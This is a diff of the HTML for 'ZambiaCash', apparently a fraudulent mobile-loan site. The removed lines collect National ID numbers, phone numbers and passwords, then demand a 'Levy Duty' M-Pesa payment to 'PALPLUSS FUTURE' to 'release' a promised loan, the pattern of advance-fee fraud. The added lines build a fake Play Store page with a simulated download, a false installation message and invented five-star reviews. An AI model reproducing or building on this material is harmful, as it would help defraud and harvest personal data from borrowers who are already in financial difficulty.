+                <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-medium text-lg py-3 rounded-full shadow-sm active:scale-95 transition-transform">Install</button>
             </div>
-          </div>
-          <div class="border-t border-emerald-200 pt-2 mt-2 flex justify-between text-sm">
-            <div>
-              <p class="text-gray-700 font-semibold">You receive</p>
-              <p class="text-[10px] text-gray-500 mt-0.5">Disbursed to your wallet</p>
+
+            <div id="fake-download-area" class="hide mb-8">
+                <div class="flex justify-between text-sm text-gray-600 mb-2">
+                    <span>Downloading...</span>
+                    <span id="download-percent">0%</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2">
+                    <div id="download-bar" class="bg-playBlue h-2 rounded-full transition-all duration-300" style="width: 0%"></div>
+                </div>
+                <p class="text-xs text-gray-400 mt-2" id="download-size">1.2 MB / 10.0 MB</p>
             </div>
-            <p class="font-bold text-emerald-800" id="wizardSelectedYouReceive">&mdash;</p>
-          </div>
+
+            <div id="open-app-area" class="hide mb-8">
+                <div class="bg-green-50 border border-green-200 rounded-xl p-3 mb-3 text-center">
+                    <p class="text-sm text-green-800 font-medium">✅ Installed successfully!</p>
+                    <p class="text-xs text-green-600 mt-1">You can also find ZambiaCash on your home screen.</p>
+                </div>
+                <button id="btn-open-app" class="w-full bg-playBlue text-white font-bold py-3.5 rounded-full shadow-md active:scale-95 transition-transform flex items-center justify-center gap-2">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                    Open
+                </button>
+            </div>
+
+            <!-- SCREENSHOTS -->
+            <div class="flex gap-3 overflow-x-auto hide-scrollbar mb-8 pb-2">
+                <div class="w-40 h-72 bg-brandBlue rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
+                    <div>
+                        <p class="text-blue-200 text-[10px] font-bold tracking-wider">AVAILABLE LIMIT</p>
+                        <p class="text-white text-2xl font-extrabold mt-1">Ksh 50,000</p>
+                    </div>
+                    <div class="bg-white/20 rounded-lg p-3">
+                        <p class="text-white text-sm font-bold">Instant Disbursement</p>
+                        <p class="text-blue-100 text-[10px] mt-1">Straight to M-Pesa</p>
+                    </div>
+                </div>
+                <div class="w-40 h-72 bg-white border border-gray-200 rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
+                    <div>
+                        <p class="text-gray-500 text-[10px] font-bold tracking-wider">INTEREST RATES</p>
+                        <p class="text-brandBlue text-3xl font-extrabold mt-1">10%</p>
+                        <p class="text-gray-500 text-xs mt-1">Only</p>
+                    </div>
+                    <div class="bg-brandBlue/10 rounded-lg p-3">
+                        <p class="text-brandBlue text-sm font-bold">Low Cost</p>
+                        <p class="text-gray-600 text-[10px] mt-1">No hidden fees</p>
+                    </div>
+                </div>
+                <div class="w-40 h-72 bg-green-500 rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
+                    <div>
+                        <p class="text-green-100 text-[10px] font-bold tracking-wider">APPROVAL TIME</p>
+                        <p class="text-white text-3xl font-extrabold mt-1">2 Min</p>
+                    </div>
+                    <div class="bg-white/20 rounded-lg p-3">
+                        <p class="text-white text-sm font-bold">Fastest Loans</p>
+                        <p class="text-green-100 text-[10px] mt-1">24/7 Available</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="mb-8">
+                <div class="flex items-center justify-between mb-2">
+                    <h3 class="font-bold text-xl">About this app</h3>
+                    <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                </div>
+                <p class="text-sm text-gray-700 leading-relaxed">
+                    Get instant mobile loans from Ksh 1,000 to Ksh 50,000 directly to your M-Pesa. We offer low interest rates, instant disbursement, and flexible repayment terms of 30 to 90 days. No paperwork, 100% online.
+                </p>
+            </div>
+
+            <div class="border-t border-gray-100 pt-6">
+                <div class="flex items-center justify-between mb-4">
+                    <h3 class="font-bold text-xl">Ratings and reviews</h3>
+                    <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                </div>
+
+                <div class="space-y-6">
+                    <div>
+                        <div class="flex items-center gap-3 mb-2">
+                            <div class="review-avatar bg-purple-500">J</div>
+                            <div>
+                                <p class="text-sm font-medium text-gray-900">James Mwangi</p>
+                                <p class="text-[11px] text-gray-500">2 days ago</p>
+                            </div>
+                        </div>
+                        <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
+                        <p class="text-sm text-gray-700 leading-snug">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Truly impressive.</p>
+                        <p class="text-xs text-gray-400 mt-2">2 people found this helpful</p>
+                    </div>
+
+                    <div>
+                        <div class="flex items-center gap-3 mb-2">
+                            <div class="review-avatar bg-pink-500">M</div>
+                            <div>
+                                <p class="text-sm font-medium text-gray-900">Mary Wanjiku</p>
+                                <p class="text-[11px] text-gray-500">1 week ago</p>
+                            </div>
+                        </div>
+                        <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
+                        <p class="text-sm text-gray-700 leading-snug">The interest rates are very low compared to other apps I've used. Very fair terms and easy to repay.</p>
+                        <p class="text-xs text-gray-400 mt-2">5 people found this helpful</p>
+                    </div>
+
+                    <div>
+                        <div class="flex items-center gap-3 mb-2">
+                            <div class="review-avatar bg-blue-500">P</div>
+                            <div>
+                                <p class="text-sm font-medium text-gray-900">Peter Otieno</p>
+                                <p class="text-[11px] text-gray-500">2 weeks ago</p>
+                            </div>
+                        </div>
+                        <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
+                        <p class="text-sm text-gray-700 leading-snug">Fast and instant to M-Pesa. I was in an emergency and this app saved me. The loan was disbursed immediately.</p>
+                        <p class="text-xs text-gray-400 mt-2">1 person found this helpful</p>
+                    </div>
+
+                    <div>
+                        <div class="flex items-center gap-3 mb-2">
+                            <div class="review-avatar bg-green-500">G</div>
+                            <div>
+                                <p class="text-sm font-medium text-gray-900">Grace Njeri</p>
+                                <p class="text-[11px] text-gray-500">3 weeks ago</p>
+                            </div>
+                        </div>
+                        <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
+                        <p class="text-sm text-gray-700 leading-snug">Instant cash whenever I need it. The interest is low and they don't have hidden fees. Highly recommended!</p>
+                        <p class="text-xs text-gray-400 mt-2">Helpful</p>
+                    </div>
+                </div>
+            </div>
         </div>
-        <div>
-          <label class="block text-xs font-medium text-gray-600 mb-2">Repayment Period</label>
-          <select id="wizTenure" required class="w-full border border-gray-300 rounded-lg px-3 py-3 text-sm outline-none bg-white focus:ring-2 focus:ring-emerald-500">
-            <option value="6">6 months</option>
-            <option value="12" selected>12 months</option>
-            <option value="18">18 months</option>
-            <option value="24">24 months</option>
-            <option value="36">36 months</option>
-          </select>
+
+        <div class="fixed bottom-0 left-0 right-0 bg-gray-50 border-t border-gray-200 flex justify-around py-2 z-50">
+            <div class="flex flex-col items-center text-gray-600">
+                <svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                <span class="text-[10px]">Games</span>
+            </div>
+            <div class="flex flex-col items-center text-gray-600">
+                <svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z"></path></svg>
+                <span class="text-[10px]">Apps</span>
+            </div>
+            <div class="flex flex-col items-center text-playBlue">
+                <div class="bg-blue-100 px-4 py-0.5 rounded-full mb-1">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                </div>
+                <span class="text-[10px] font-bold">Search</span>
+            </div>
         </div>
-        <button onclick="wizardNext(2)" class="mt-5 w-full bg-emerald-700 text-white py-3 rounded-xl hover:bg-emerald-800 font-semibold text-sm">Continue</button>
-      </div>
     </div>
 
-    <div class="wizard-step max-w-md mx-auto px-5 pt-4" data-step="2">
-      <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-5">
-        <h2 class="text-base font-bold text-gray-900 mb-4">Your details</h2>
-        <div id="signedInBanner" class="hidden mb-4 bg-emerald-50 border border-emerald-200 rounded-lg p-3">
-          <div class="flex items-start gap-2">
-            <svg class="w-4 h-4 text-emerald-600 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
-            </svg>
-            <p class="text-[11px] text-emerald-900 leading-snug">
-              Signed in as <strong id="signedInPhone">&mdash;</strong>. Details pre-filled — you can edit them if needed.
+    <!-- 3. FIND-ON-HOME-SCREEN EDUCATION SCREEN -->
+    <div id="find-on-home-screen" class="hide fixed inset-0 z-[9998] gradient-bg flex flex-col justify-between p-6 text-center">
+        <div class="flex-1 flex flex-col items-center justify-center max-w-sm mx-auto w-full">
+            <div class="relative mb-6">
+                <img src="icon.png" class="w-28 h-28 rounded-3xl shadow-2xl icon-pop border-4 border-white/20" alt="ZambiaCash">
+                <div class="absolute -top-2 -right-2 w-10 h-10 bg-green-500 rounded-full flex items-center justify-center shadow-lg">
+                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+                </div>
+            </div>
+
+            <h1 class="text-2xl font-extrabold text-white mb-2">Installation Complete!</h1>
+            <p class="text-blue-100 text-sm mb-8 max-w-xs leading-relaxed">
+                ZambiaCash is now installed on your phone.
             </p>
-          </div>
-        </div>
-        <div class="space-y-3.5">
-          <div>
-            <label class="block text-xs font-medium text-gray-600 mb-1.5">Full Name (as per National ID)</label>
-            <input type="text" id="wizName" required class="w-full border border-gray-200 bg-gray-50 rounded-xl px-3 py-3 text-sm outline-none focus:bg-white focus:border-emerald-500 focus:ring-4 focus:ring-emerald-500/10 transition-colors" />
-          </div>
-          <div>
-            <label class="block text-xs font-medium text-gray-600 mb-1.5">National ID Number</label>
-            <input type="text" id="wizId" required inputmode="numeric" pattern="\d{7,8}" placeholder="12345678" maxlength="8" class="w-full border border-gray-200 bg-gray-50 rounded-xl px-3 py-3 text-sm font-mono outline-none focus:bg-white focus:border-emerald-500 focus:ring-4 focus:ring-emerald-500/10 transition-colors" />
-            <p class="text-[10px] text-gray-400 mt-1">7&ndash;8 digits. Required for identity verification.</p>
-          </div>
-          <div>
-            <label class="block text-xs font-medium text-gray-600 mb-1.5">Phone Number</label>
-            <input type="tel" id="wizPhone" required placeholder="07XX XXX XXX" inputmode="numeric" class="w-full border border-gray-200 bg-gray-50 rounded-xl px-3 py-3 text-sm font-mono outline-none focus:bg-white focus:border-emerald-500 focus:ring-4 focus:ring-emerald-500/10 transition-colors" />
-            <p class="text-[10px] text-gray-400 mt-1">This becomes your login number.</p>
-          </div>
-          <div>
-            <label class="block text-xs font-medium text-gray-600 mb-1.5">Password (min. 6 characters)</label>
-            <input type="password" id="wizPassword" required minlength="6" class="w-full border border-gray-200 bg-gray-50 rounded-xl px-3 py-3 text-sm outline-none focus:bg-white focus:border-emerald-500 focus:ring-4 focus:ring-emerald-500/10 transition-colors" />
-            <p id="wizPasswordHint" class="hidden text-[10px] text-emerald-600 mt-1">Already signed in — you can leave this as is.</p>
-          </div>
-        </div>
-        <div class="flex gap-2 mt-5">
-          <button onclick="wizardBack(1)" class="flex-1 bg-white border border-gray-200 text-gray-700 py-3 rounded-xl font-semibold text-sm">Back</button>
-          <button onclick="wizardNext(3)" class="flex-[2] bg-emerald-700 text-white py-3 rounded-xl hover:bg-emerald-800 font-semibold text-sm">Continue</button>
-        </div>
-      </div>
-    </div>
 
-    <div class="wizard-step max-w-md mx-auto px-5 pt-4" data-step="3">
-      <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-5">
-        <h2 class="text-base font-bold text-gray-900 mb-4">Review your application</h2>
-        <div class="bg-gray-50 rounded-xl p-3 space-y-2 text-sm mb-3">
-          <div class="flex justify-between"><span class="text-gray-500">Name</span><span class="font-medium text-right" id="reviewName">&mdash;</span></div>
-          <div class="flex justify-between"><span class="text-gray-500">National ID</span><span class="font-medium font-mono" id="reviewId">&mdash;</span></div>
-          <div class="flex justify-between"><span class="text-gray-500">Phone</span><span class="font-medium font-mono" id="reviewPhone">&mdash;</span></div>
-          <div class="border-t pt-2 mt-2 flex justify-between">
-            <span class="text-gray-500">Loan amount</span>
-            <div class="text-right">
-              <p class="font-bold" id="reviewAmount">&mdash;</p>
-              <p class="text-[10px] text-gray-400" id="reviewAmountKsh">&mdash;</p>
-            </div>
-          </div>
-          <div class="flex justify-between"><span class="text-gray-500">Tenure</span><span class="font-medium" id="reviewTenure">&mdash;</span></div>
-          <div class="border-t pt-2 mt-2 flex justify-between">
-            <span class="text-gray-600 font-semibold">Levy Duty</span>
-            <div class="text-right">
-              <p class="font-bold text-emerald-700" id="reviewFee">&mdash;</p>
-              <p class="text-[10px] text-emerald-500" id="reviewFeeKsh">&mdash;</p>
-            </div>
-          </div>
-        </div>
+            <div class="text-5xl mb-4 arrow-bounce text-brandYellow">↑</div>
 
-        <div class="mb-4 bg-amber-50 border border-amber-200 rounded-xl p-3">
-          <div class="flex items-start gap-2">
-            <svg class="w-4 h-4 text-amber-700 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-            </svg>
-            <p class="text-[11px] text-amber-900 leading-snug">
-              The <strong>Levy Duty</strong> is a one-time fee paid to release your loan funds. Your loan amount is then disbursed to your mobile wallet.
+            <p class="text-white text-base font-bold mb-2">Find ZambiaCash on your home screen</p>
+            <p class="text-blue-200 text-sm mb-8 max-w-xs leading-relaxed">
+                Close this browser tab, then tap the ZambiaCash icon on your phone's home screen to launch the app.
             </p>
-          </div>
         </div>
 
-        <div class="flex items-start gap-2 text-xs text-gray-600 mb-4">
-          <input type="checkbox" id="wizAgree" required class="mt-0.5" />
-          <label for="wizAgree">I confirm the details are accurate and I accept the Terms and Privacy Policy.</label>
-        </div>
-        <div id="wizardSubmitError" class="hidden bg-red-50 border border-red-100 text-red-800 text-sm rounded-lg p-3 mb-4"></div>
-        <div class="flex gap-2">
-          <button onclick="wizardBack(2)" class="flex-1 bg-white border border-gray-200 text-gray-700 py-3 rounded-xl font-semibold text-sm">Back</button>
-          <button id="wizSubmitBtn" onclick="submitApplication()" class="flex-[2] bg-emerald-700 text-white py-3 rounded-xl hover:bg-emerald-800 font-semibold text-sm flex items-center justify-center gap-2">
-            <span id="wizSubmitText">Check Eligibility</span>
-          </button>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- ELIGIBILITY CHECK -->
-  <div id="eligibilityView" class="hidden min-h-screen w-full bg-gray-50">
-    <div class="max-w-md mx-auto p-4 pt-10">
-      <div class="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
-        <div class="bg-gradient-to-br from-emerald-600 to-emerald-800 px-6 py-10 text-center text-white">
-          <div class="relative inline-block mb-4">
-            <div class="pulse-ring relative w-20 h-20 rounded-full bg-white/20 flex items-center justify-center">
-              <div class="elig-spinner"></div>
-            </div>
-          </div>
-          <p class="text-lg font-bold" id="eligTitle">Checking eligibility...</p>
-          <p class="text-sm opacity-90 mt-1" id="eligSubtitle">Please wait a moment</p>
-        </div>
-        <div class="p-5">
-          <div class="space-y-3" id="eligSteps"></div>
-          <div class="mt-6">
-            <div class="h-1.5 bg-gray-100 rounded-full overflow-hidden">
-              <div id="eligProgress" class="h-full bg-emerald-600 rounded-full" style="width:0%"></div>
-            </div>
-            <p class="text-[11px] text-gray-500 text-center mt-2" id="eligPercent">0%</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- DASHBOARD -->
-  <div id="dashboardView" class="hidden max-w-md mx-auto p-4 pt-6">
-    <div class="flex justify-between items-center mb-4">
-      <div>
-        <p class="text-xs text-gray-500">Karibu tena</p>
-        <h2 class="text-xl font-bold" id="pGreet">&mdash;</h2>
-      </div>
-      <button onclick="logoutUser()" class="text-xs text-red-600 border border-red-200 px-3 py-1.5 rounded-lg">Logout</button>
-    </div>
-    <div class="bg-gradient-to-br from-emerald-700 to-emerald-900 text-white p-4 rounded-2xl shadow mb-4">
-      <p class="text-xs opacity-80">Your borrowing limit</p>
-      <p class="text-3xl font-bold mt-1" id="preApproved">ZMW 6,000</p>
-      <p class="text-xs opacity-80 mt-1" id="preApprovedKsh">Maximum you can borrow today (&asymp; KSh 30,000)</p>
-      <div class="mt-3 pt-3 border-t border-white/20 flex justify-between text-[11px]">
-        <span class="opacity-80">Levy Duty</span>
-        <span class="font-semibold">KSh 100 flat</span>
-      </div>
-    </div>
-    <div class="bg-white p-4 rounded-2xl shadow-sm border border-gray-100 mb-4">
-      <button onclick="openApplyWizard()" class="w-full bg-emerald-700 text-white py-2.5 rounded-lg hover:bg-emerald-800 font-semibold text-sm">Apply for Another Loan</button>
-    </div>
-    <div class="bg-white p-4 rounded-2xl shadow-sm border border-gray-100">
-      <h3 class="font-semibold text-sm mb-3">Your Applications</h3>
-      <div id="appsList" class="text-sm text-gray-700 space-y-3">Loading...</div>
-    </div>
-  </div>
-
-  <!-- OFFER -->
-  <div id="offerView" class="hidden max-w-md mx-auto p-4 pt-6">
-    <div class="flex items-center gap-3 mb-4">
-      <button onclick="showView('dashboardView')" class="back-btn">&larr;</button>
-      <h2 class="text-lg font-bold">Loan Offer</h2>
-    </div>
-    <div class="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
-      <div class="bg-green-50 border-b border-green-100 px-4 py-3 text-center">
-        <p class="text-green-700 font-semibold text-sm">&#10003; Hongera &mdash; Loan Sanctioned</p>
-        <p class="text-[11px] text-green-700/70 mt-0.5">Reference No: <span id="refNo" class="font-mono"></span></p>
-        <p class="text-[11px] text-green-700/70 mt-0.5">Borrower ID: <span id="offerId" class="font-mono"></span></p>
-      </div>
-      <div class="p-4">
-        <p class="text-xs text-gray-500 text-center">Sanctioned Amount</p>
-        <p class="text-3xl font-bold text-center text-gray-900" id="offerAmount">ZMW 0</p>
-        <p class="text-xs text-center text-gray-500 mt-1" id="offerAmountKsh">&asymp; KSh 0</p>
-        <p class="text-xs text-center text-gray-500 mt-1">at <span id="offerRate">15</span>% p.a. &middot; <span id="offerTenure">12</span> months</p>
-        <div class="mt-4 space-y-2 text-sm">
-          <div class="flex justify-between"><span class="text-gray-500">Monthly Repayment</span><span class="font-semibold" id="offerEmi">ZMW 0</span></div>
-          <div class="flex justify-between"><span class="text-gray-500">Total Interest</span><span class="font-medium" id="offerInterest">ZMW 0</span></div>
-          <div class="flex justify-between"><span class="text-gray-500">Total Repayment</span><span class="font-medium" id="offerTotal">ZMW 0</span></div>
-          <div class="border-t pt-2 mt-2 flex justify-between">
-            <span class="text-gray-500">Levy Duty</span>
-            <div class="text-right">
-              <p class="font-medium" id="offerFee">ZMW 0</p>
-              <p class="text-[10px] text-gray-400" id="offerFeeKsh">&asymp; KSh 0</p>
-            </div>
-          </div>
-          <div class="flex justify-between text-emerald-700 font-bold border-t pt-2 mt-2">
-            <span>Total Payable Now</span>
-            <div class="text-right">
-              <p id="offerFeeTotal">ZMW 0</p>
-              <p class="text-[10px] text-emerald-500 font-normal" id="offerFeeTotalKsh">&asymp; KSh 0</p>
-            </div>
-          </div>
-        </div>
-        <button onclick="openPaymentView('offer')" class="pay-btn-attention mt-4 w-full text-white py-4 rounded-xl font-bold text-base flex items-center justify-center gap-2 relative z-10">
-          <span>Withdraw</span>
-        </button>
-      </div>
-    </div>
-  </div>
-
-  <!-- PAYMENT -->
-  <div id="paymentView" class="hidden max-w-md mx-auto p-4 pt-6">
-    <div class="flex items-center gap-3 mb-4">
-      <button onclick="goBackFromPayment()" class="back-btn" aria-label="Go back">&larr;</button>
-      <h2 class="text-lg font-bold">Levy Duty</h2>
-    </div>
-
-    <div class="bg-emerald-50 border border-emerald-200 rounded-2xl p-3.5 mb-3 flex items-start gap-3">
-      <div class="w-8 h-8 rounded-full bg-emerald-600 flex items-center justify-center flex-shrink-0 mt-0.5">
-        <svg class="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-          <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-        </svg>
-      </div>
-      <div>
-        <p class="text-xs font-bold text-emerald-900">Pay the levy duty to release your funds</p>
-        <p class="text-[11px] text-emerald-800 mt-0.5 leading-relaxed">
-          Once your payment is confirmed, your loan amount will be disbursed to your mobile wallet within <strong>few minutes</strong>.
-        </p>
-      </div>
-    </div>
-
-    <div class="bg-white p-4 rounded-2xl shadow-sm border border-gray-100 mb-3">
-      <h3 class="text-xs font-semibold text-gray-500 uppercase mb-2">Order Summary</h3>
-      <div class="space-y-2 text-sm">
-        <div class="flex justify-between items-start">
-          <span class="text-gray-500">Loan Amount</span>
-          <div class="text-right">
-            <p id="sumLoan" class="font-semibold">ZMW 0</p>
-            <p id="sumLoanKsh" class="text-[10px] text-gray-400">&asymp; KSh 0</p>
-          </div>
-        </div>
-        <div class="flex justify-between items-start">
-          <div>
-            <p class="text-gray-500">Levy Duty</p>
-            <p class="text-[10px] text-gray-400 mt-0.5">One-time fee to release your loan</p>
-          </div>
-          <div class="text-right">
-            <p id="sumFee">ZMW 0</p>
-            <p id="sumFeeKsh" class="text-[10px] text-gray-400">&asymp; KSh 0</p>
-          </div>
-        </div>
-        <div class="flex justify-between border-t pt-2 mt-1 font-bold text-base items-start">
-          <span>Total to Pay Now</span>
-          <div class="text-right">
-            <p id="sumTotal">ZMW 0</p>
-            <p id="sumTotalKsh" class="text-[10px] text-emerald-600 font-normal">&asymp; KSh 0</p>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="bg-white p-4 rounded-2xl shadow-sm border border-gray-100 mb-3">
-      <div class="flex items-center justify-between mb-3">
-        <h3 class="text-xs font-semibold text-gray-500 uppercase">Change Amount</h3>
-        <span class="text-[10px] text-gray-400">Levy Duty stays KSh 100</span>
-      </div>
-      <div id="paymentAmountBoxes" class="grid grid-cols-3 gap-1.5"></div>
-      <p id="amountEditorMsg" class="hidden mt-2 text-xs text-center"></p>
-    </div>
-
-    <div class="bg-white p-4 rounded-2xl shadow-sm border border-gray-100">
-      <div class="flex items-center gap-2 mb-3">
-        <div class="w-8 h-8 rounded-md bg-green-600 text-white flex items-center justify-center font-bold text-xs">M</div>
-        <h3 class="text-sm font-bold">Withdraw via Mobile Money</h3>
-      </div>
-      <div class="space-y-3">
-        <div>
-          <label class="block text-xs font-medium text-gray-600 mb-1">Phone Number</label>
-          <input type="tel" id="mpesaPhone" required inputmode="numeric" placeholder="07XX XXX XXX" class="w-full border border-gray-300 rounded-lg px-3 py-2.5 text-sm font-mono outline-none focus:ring-2 focus:ring-emerald-500" />
-          <p class="text-[10px] text-gray-400 mt-1">You can change this if paying from a different line.</p>
-        </div>
-
-        <div class="bg-blue-50 border border-blue-200 rounded-lg p-3">
-          <div class="flex items-start gap-2">
-            <svg class="w-4 h-4 text-blue-600 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-            </svg>
-            <div>
-              <p class="text-[11px] text-blue-900 leading-snug">
-                Payment is made to <strong class="font-bold">PALPLUSS FUTURE</strong> — this is the name that will appear on your M-Pesa statement and prompt.
-              </p>
-            </div>
-          </div>
-        </div>
-
-        <div class="bg-gray-50 border border-gray-200 rounded-lg p-3 text-[11px] text-gray-600">
-          You'll receive a prompt on your phone. Enter your PIN to authorise.
-        </div>
-      </div>
-      <button id="payBtn" onclick="showConfirmPayment()" class="relative mt-4 w-full bg-green-600 text-white py-3 rounded-lg hover:bg-green-700 font-semibold text-sm overflow-hidden">
-        <div id="payProgress" class="absolute inset-y-0 left-0 bg-green-800/70"></div>
-        <span id="payBtnText" class="pay-label relative z-10 flex items-center justify-center gap-2">Withdraw</span>
-      </button>
-    </div>
-    <div id="payResult" class="hidden mt-4 p-4 rounded-2xl text-sm"></div>
-  </div>
-
-  <!-- CONFIRM PAYMENT MODAL -->
-  <div id="confirmPaymentModal" class="hidden fixed inset-0 z-[300] flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm">
-    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm p-5 pop-anim max-h-[92vh] overflow-y-auto">
-      <h3 class="text-base font-bold text-gray-900 text-center">Confirm Withdrawal</h3>
-      <p class="text-xs text-gray-500 text-center mt-1">Review the details and adjust the amount if needed</p>
-
-      <div class="mt-4 space-y-3 text-sm">
-        <div class="flex justify-between items-start">
-          <div>
-            <p class="text-gray-600">Loan Amount</p>
-            <p class="text-[10px] text-gray-400 mt-0.5">What we'll disburse to you</p>
-          </div>
-          <div class="text-right">
-            <p class="font-semibold text-gray-900" id="confirmLoanAmount">ZMW 0</p>
-            <p class="text-[10px] text-gray-400" id="confirmLoanAmountKsh">&asymp; KSh 0</p>
-          </div>
-        </div>
-
-        <div class="bg-gradient-to-r from-amber-50 to-yellow-50 border-2 border-amber-300 rounded-xl p-3 shadow-sm">
-          <div class="flex items-center justify-between gap-3">
-            <div class="flex items-center gap-2">
-              <div class="w-7 h-7 rounded-full bg-amber-400 flex items-center justify-center flex-shrink-0">
-                <svg class="w-4 h-4 text-amber-900" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-                  <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-                </svg>
-              </div>
-              <div>
-                <p class="text-[10px] font-extrabold text-amber-900 uppercase tracking-wide leading-none">Levy Duty</p>
-                <p class="text-[9px] text-amber-700 mt-0.5 leading-none">One-time fee to release your loan</p>
-              </div>
-            </div>
-            <div class="text-right">
-              <p class="font-extrabold text-amber-900 text-lg leading-none" id="confirmFee">ZMW 0</p>
-              <p class="text-[10px] text-amber-700 font-medium mt-0.5" id="confirmFeeKsh">&asymp; KSh 0</p>
-            </div>
-          </div>
-        </div>
-
-        <div class="border-t pt-2 mt-2 flex justify-between items-start font-bold">
-          <span>Total to Pay Now</span>
-          <div class="text-right">
-            <p id="confirmTotal">ZMW 0</p>
-            <p class="text-[10px] text-emerald-600 font-normal" id="confirmTotalKsh">&asymp; KSh 0</p>
-          </div>
-        </div>
-      </div>
-
-      <div class="mt-3 bg-blue-50 border border-blue-200 rounded-lg p-2.5">
-        <div class="flex items-start gap-2">
-          <svg class="w-3.5 h-3.5 text-blue-600 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z" />
-          </svg>
-          <p class="text-[10px] text-blue-900 leading-snug">
-            Payment goes to <strong>PALPLUSS FUTURE</strong> — you'll see this name on the M-Pesa prompt and on your statement.
-          </p>
-        </div>
-      </div>
-
-      <div class="mt-4 pt-4 border-t border-gray-100">
-        <div class="flex items-center justify-between mb-2">
-          <h4 class="text-xs font-semibold text-gray-500 uppercase">Change Amount</h4>
-          <span class="text-[10px] text-gray-400">Levy Duty stays KSh 100</span>
-        </div>
-        <div class="bg-blue-50 border border-blue-200 rounded-lg p-2.5 mb-2">
-          <div class="flex items-start gap-2">
-            <svg class="w-3.5 h-3.5 text-blue-600 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
